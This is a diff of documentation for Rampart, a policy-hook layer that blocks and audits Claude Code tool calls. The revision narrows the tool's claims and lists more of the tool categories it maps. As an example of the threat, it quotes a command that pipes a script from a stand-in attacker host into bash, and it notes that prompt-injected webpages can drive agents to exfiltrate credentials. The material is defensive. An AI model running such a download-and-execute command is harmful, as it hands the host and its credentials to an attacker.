@@ -1,11 +1,11 @@
 ---
 title: Securing Claude Code
-description: "Secure Claude Code with Rampart. Block dangerous commands, restrict file access, detect prompt injection, and audit everything — works in --dangerously-skip-permissions mode."
+description: "Add Rampart policy hooks to Claude Code. Block matched hook-visible actions, restrict file access, and audit observed decisions, including in bypass-permissions mode."
 ---
 
 # Securing Claude Code
 
-Claude Code is Rampart's primary integration. One command, native hooks, zero overhead.
+Claude Code is a supported Rampart integration using native lifecycle hooks.
 
 ## Why You Need This
 
@@ -16,7 +16,11 @@ Claude Code in `--dangerously-skip-permissions` mode gives the agent unrestricte
 - `curl http://attacker.com/exfil | bash` executes without warning
 - A prompt-injected webpage can redirect the agent to exfiltrate your credentials
 
-Rampart sits between Claude Code and your system. Every command is evaluated against your policy before it runs. Dangerous commands are blocked in microseconds. Everything is logged.
+Rampart evaluates Bash, PowerShell, and other tool calls that Claude Code sends
+to lifecycle hooks. A matched deny is returned before that tool runs and the
+decision is audited. Rampart does not inspect arbitrary behavior inside an
+allowed command and cannot govern a host action that Claude Code does not emit
+to hooks.
 
 ## What Gets Protected by Default
 
@@ -44,7 +48,14 @@ That's it. This installs wildcard `PreToolUse`, `PostToolUse`, and
 - **Write, Edit, NotebookEdit, and worktree creation** (`write`)
 - **WebFetch and WebSearch calls** (`fetch`)
 - **MCP tools** (`mcp`)
-- **Agent and Workflow delegation** (`agent`)
+- **Agent, Workflow, and remote-routine delegation** (`agent`)
+- **Artifact, notification, message, and user-file delivery** (`message`)
+- **Cron, wakeup, and task-state operations** (`process`)
+
+These mappings were reviewed against Claude Code 2.1.220. In enforce mode,
+future unknown `PreToolUse` tool names fail closed until Rampart is updated.
+Claude documents some host-owned tools that intentionally do not emit `PreToolUse`;
+`EndConversation` is one benign example and has no file or network effect.
 
 ## How It Works
 
@@ -73,7 +84,7 @@ When Claude Code wants to run a command, it sends the tool call to `rampart hook
 
 **Ask behavior:** When a policy action is `ask`, the hook returns `"permissionDecision":"ask"`. Claude Code shows its native permission prompt, so the user approves or denies directly in the Claude Code UI.
 
-Denied calls never execute. If a response-side rule denies successful tool
+Calls denied by the working `PreToolUse` hook do not execute. If a response-side rule denies successful tool
 output, Rampart returns a shape-preserving `updatedToolOutput` with string
 content redacted and a block reason. The tool has already run, but the original
 content is not passed into Claude's next model turn.
@@ -86,7 +97,8 @@ Just use Claude Code normally:
 claude
 ```
 
-Rampart is completely transparent. Safe commands pass through in microseconds. You won't notice it's there — until it blocks something dangerous.
+Allowed calls continue normally. Use `rampart watch` or the local audit log to
+confirm which calls actually crossed the Rampart boundary.
 
 ## Monitor in Real Time
 
